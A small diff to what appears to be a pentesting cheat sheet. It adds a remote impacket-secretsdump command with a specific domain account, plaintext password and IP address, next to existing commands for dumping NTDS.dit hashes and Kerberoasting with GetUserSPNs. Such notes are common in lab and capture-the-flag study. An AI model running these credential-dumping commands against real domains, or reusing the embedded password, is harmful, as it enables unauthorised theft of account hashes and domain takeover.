@@ -35,6 +35,10 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
 ```
+impacket-secretsdump sync.csl/manager:'!!MILKSHAKE!!'@172.31.3.6
+```
+
+```
 impacket-GetUserSPNs -request -dc-ip $DomainIP $DomainName/$DomainUser
 ```
 
